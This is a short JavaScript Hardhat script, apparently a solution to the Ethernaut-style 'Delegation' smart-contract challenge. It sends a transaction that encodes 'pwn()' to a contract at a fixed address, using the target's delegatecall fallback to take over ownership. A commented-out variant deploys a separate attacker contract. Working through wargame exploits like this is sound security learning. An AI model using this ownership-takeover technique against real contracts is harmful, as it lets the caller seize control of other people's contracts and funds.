const { Wallet } =  require("ethers");
const { ethers } =  require("hardhat");

const CONTRACT_NAME = "Delegation";
const CONTRACT_ADDRESS = "0x0c177915d98AB06D1D52cBaad426792E24c94b05";

async function main() {
  const [attacker,deployer] = await ethers.getSigners();  
  
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  // attach para interactuar con un contrato ya deployado
  const contract = factory.attach(CONTRACT_ADDRESS);

//   const factoryAttackerV3 = await ethers.getContractFactory("attackerV3", deployer);
//   this.attacker = await factoryAttackerV3.deploy();

//   const tx = await this.attacker.attack(contract.address);
//   await tx.wait();
//   console.log("Tx success ✨")

  let ABI = ["function pwn()"];
  let interface = new ethers.utils.Interface(ABI);
  let data = interface.encodeFunctionData("pwn");
  
  const tx = await attacker.sendTransaction({
    to: contract.address,
    data,
    gasLimit: 100000
  });

await tx.wait();
console.log("Tx success ✨")



 
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});

